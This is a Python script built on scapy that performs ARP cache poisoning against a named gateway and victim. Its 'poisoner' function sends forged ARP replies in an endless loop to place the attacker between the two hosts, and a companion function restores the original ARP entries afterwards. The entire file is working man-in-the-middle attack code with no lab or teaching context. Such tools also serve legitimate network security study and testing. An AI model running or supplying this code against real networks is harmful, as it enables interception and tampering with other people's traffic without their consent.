from re import match
from time import sleep
from scapy.all import *

BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"

def MAC_for_IP(given_IP, timeout=2, retry=2, verbose=0):
    """
    Function for obtaining the MAC Address for a given IP Address.

    Args:
        given_IP    : IP address of the interface
    Optional Args:
        timeout     : Amount of time in seconds to wait until
                      receiving a reply from last packet sent (default=2)
        retry       : Number of retries to performs until
                      receiving an answer (default=2)
        verbose     : Verbosity level (default=0)
    """
    broadcast_arp_frame = Ether(dst=BROADCAST_MAC)/ARP(op="who-has", pdst=given_IP)
    recv = srp1(broadcast_arp_frame, timeout=timeout, retry=-retry, verbose=verbose)
    if recv is not None:
        return recv.payload.hwsrc
    return None


def poisoner(gateway_IP, victim_IP, new_MAC=None, verbose=0, interval=1):
    """
    Main poisoner function.

    Args:
        gateway_IP  : IP address of the gateway router
        victim_IP   : IP address of the victim machine
    Optional Args:
        new_MAC     : MAC address to replace with (default=None, meaning the current system)
        verbose     : Verbosity level (default=0)
        interval    : Interval between attacks (default=1)
    """
    if verbose > 0:
        print("Finding MAC addresses for gateway and victim...", end="")
    gateway_MAC = MAC_for_IP(given_IP=gateway_IP, verbose=verbose)
    victim_MAC = MAC_for_IP(given_IP=victim_IP, verbose=verbose)
    if verbose > 0:
        print("done")

    if verbose > 0:
        print("Creating ARP packets...", end="")
    # This creates a packet to the gateway spoofing the ARP entry
    frame_to_gateway = ARP(op="is-at", pdst=gateway_IP, hwdst=gateway_MAC, psrc=victim_IP)

    # This creates a packet to the victim node spoofing the ARP entry
    frame_to_victim = ARP(op="is-at", pdst=victim_IP, hwdst=victim_MAC, psrc=gateway_IP)

    if new_MAC is not None:
        # Check if the MAC address satisfies format
        assert (match("[0-9a-f]{2}((:)[0-9a-f]{2}){5}", new_MAC.lower()) is not None),\
            "Supplied MAC address doesn't match specification"

        frame_to_gateway.hwsrc = new_MAC
        frame_to_victim.hwsrc = new_MAC

    if verbose > 0:
        print("done")

    # Keep doing this for a long time i.e., until the poisoner stops it.
    n_times = 0
    while 1:
        try:
            send(frame_to_gateway)
            send(frame_to_victim)
            sleep(interval)
            n_times += 1
        except KeyboardInterrupt:
            break

    return n_times

def ARP_restore(gateway_IP, victim_IP, verbose):
    """
    Generally used to revert the changes made by the poisoning attack.

    Args:
        gateway_IP  : IP address of the gateway router
        victim_IP   : IP address of the victim machine
    Optional Args:
        verbose     : Verbosity level (default=0)
    """
    if verbose > 0:
        print("Find MAC addresses for gateway and victim...", end="")
    gateway_MAC = MAC_for_IP(given_IP=gateway_IP, verbose=verbose)
    victim_MAC = MAC_for_IP(given_IP=victim_IP, verbose=verbose)

    if verbose > 0:
        print("done")

    if verbose > 0:
        print("Creating ARP packets...", end="")
    # This creates a packet to the gateway to reset the correct entry
    frame_from_victim = ARP(op="is-at", pdst=gateway_IP, hwdst=BROADCAST_MAC, psrc=victim_IP, hwsrc=victim_MAC)

    # This creates a packet to the victim node to reset the correct entry
    frame_from_gateway = ARP(op="is-at", pdst=victim_IP, hwdst=BROADCAST_MAC, psrc=gateway_IP, hwsrc=gateway_MAC)

    if verbose > 0:
        print("done")

    if verbose > 0:
        print("Resetting...")
    # Send it 5 times to be sure.
    for _ in range(0, 5):
        send(frame_from_victim)
        send(frame_from_gateway)

    if verbose > 0:
        print("done")
